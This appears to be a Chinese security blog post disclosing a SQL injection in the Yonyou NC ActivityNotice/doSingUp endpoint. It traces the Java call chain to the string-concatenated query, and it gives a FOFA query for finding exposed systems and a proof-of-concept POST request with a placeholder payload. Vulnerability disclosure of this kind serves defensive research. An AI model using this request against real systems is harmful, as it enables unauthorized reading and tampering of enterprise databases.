---
title: "用友NC ActivityNotice/doSingUp SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ActivityNotice-doSingUp-sqli.html
asset_dir: assets/用友nc-activitynoticedosingup-sql注入漏洞
---

# 用友NC ActivityNotice/doSingUp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/25 08:19
* 870浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

数据库

鉴权

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统的 ActivityNotice/doSingUp 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意的 SQL 语句注入请求参数，绕过身份验证或获取数据库敏感信息，进而可能导致任意数据读取、篡改甚至系统权限提升，影响系统的安全性和数据完整性。

SQL注入防护

# 影响版本

NC63、NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

深入探索

漏洞修复方案

安全认证考试

企业安全咨询

直接看`ActivityAction` 类的`doSingUp`方法的实现逻辑吧

```
@Servlet(
    path = "/ActivityNotice"
)
public class ActivityAction extends BaseAction {

@Action
public void doSingUp() {
    HttpServletResponse response = this.getResponse();
    response.setContentType("text/html");
    response.setHeader("Cache-Control", "no-cache");
    response.setCharacterEncoding("UTF-8");
    response.addHeader("Content-type", "text/html;charset=UTF-8");
    HttpServletRequest request = this.request;
    String pk_user = request.getParameter("pk_psndoc");
    String actid = request.getParameter("actid");
    if (pk_user != null && !pk_user.equals("")) {
        IActivitySignupService signup = (IActivitySignupService)NCLocator.getInstance().lookup(IActivitySignupService.class);

        try {
            if (signup.isSingup(pk_user, actid, pk_user)) {
                signup.addUserActivitySignup(pk_user, actid, pk_user, true);
            }
        } catch (BusinessException e3) {
            throw new LfwRuntimeException(e3.getMessage());
        }
```

参数`pk_psndoc`、和`actid`被带入`addUserActivitySignup`方法，跟进`addUserActivitySignup`方法看下

代码安全审计

```
public void addUserActivitySignup(String pkUser, String pkActivity, String signupUser, boolean isSchedule) throws BusinessException {
    SignUpVO signup = this.createSignUpFromUser(signupUser);
    signup.setStatus(2);
    signup.setSignupactivity(pkActivity);
    this.saveUserActivitySignup(pkUser, pkActivity, signup, isSchedule);
}
```

继续跟进`saveUserActivitySignup`方法

```
public SignUpVO saveUserActivitySignup(String pkUser, String pkActivity, SignUpVO signup, boolean isSchedule) throws BusinessException {
    AggActivityVO activityVO = this.getAggActivityVOByUserPKandActivity(signup.getPk_person(), pkActivity);
```

深入探索

云安全解决方案

技术文章订阅

Docker加速服务

继续跟进`getAggActivityVOByUserPKandActivity`方法

```
private AggActivityVO getAggActivityVOByUserPKandActivity(String pk_person, String pkActivity) throws BusinessException {
    AggActivityVO activityVO = this.getActivityQueryService().getAggActivityByPk(pkActivity);
```

继续跟进`getAggActivityByPk`方法

```
public AggActivityVO getAggActivityByPk(String pk_activity) throws LfwBusinessException, BusinessException {
    if (pk_activity != null && pk_activity.length() != 0) {
        AggActivityVO aggvo = (AggActivityVO)this.getOaQueryService().queryBillOfVOByPK(AggActivityVO.class, pk_activity, true);
```

继续跟进`queryBillOfVOByPK`方法

```
public <T> T queryBillOfVOByPK(Class<T> voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    return (T)(new MDBaseDAO()).queryBillOfVOByPK(voClass, billPK, bLazyLoad);
}
public Object queryBillOfVOByPK(Class voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject ncObj = (new VOQueryPersister(voClass.getName())).queryBillImp(billPK, bLazyLoad);
```

继续跟进`queryBillImp`方法

```
protected NCObject queryBillImp(String billPK, boolean bLazyLoad) throws MetaDataException {
    NCObject resNCObj = null;

    try {
        Object resVO = this.dao.retrieveByPK(billPK, this.ignoreDrEqual1);
```

跟进`retrieveByPK`方法

```
public Object retrieveByPK(String pkValue, boolean ignoreDrEqual1) throws MetaDataException {
    if (this.metaCollection != null && this.metaCollection.size() != 0) {
        String whereConStr = "";
        whereConStr = (String)this.tableAliasMap.get(this.bean.getTable().getName()) + "." + this.bean.getTable().getPrimaryKeyName() + "='" + pkValue + "'";
        if (ignoreDrEqual1) {
            whereConStr = whereConStr + " and isnull(" + this.bean.getTable().getName() + ".dr,0)=0 ";
        }
```

跟到这里，[漏洞](https://mrxn.net/tag/%E6%B3%A8%E5%85%A5)原因就很明了了，参数**actid**经过一系列的传递，最终在`retrieveByPK`方法这里被拼接进SQL语句中，整个过程没有对参数**actid**进行校验或过滤，从而造成了[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，也是朴实无华的！这个类之前也发过相关SQL注入漏洞：[用友NC ActivityNotice/export SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html)

漏洞扫描服务

# 漏洞复现

> 需注意NC 大多数为Oracle 少数MSSQL

```
POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

pageId=login&pk_psndoc=1&actid=SQLI_POC
```

[![用友NC ActivityNotice/doSingUp SQL注入漏洞](images/img-001-956e03a54e17.webp)](https://image.mrxn.net/9f4821689772405383336b420b6b73af.webp)

通过报错注入成功在响应回显当前数据库用户！

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC ActivityNotice/doSingUp SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-ActivityNotice-doSingUp-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-ActivityNotice-doSingUp-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ActivityNotice-doSingUp-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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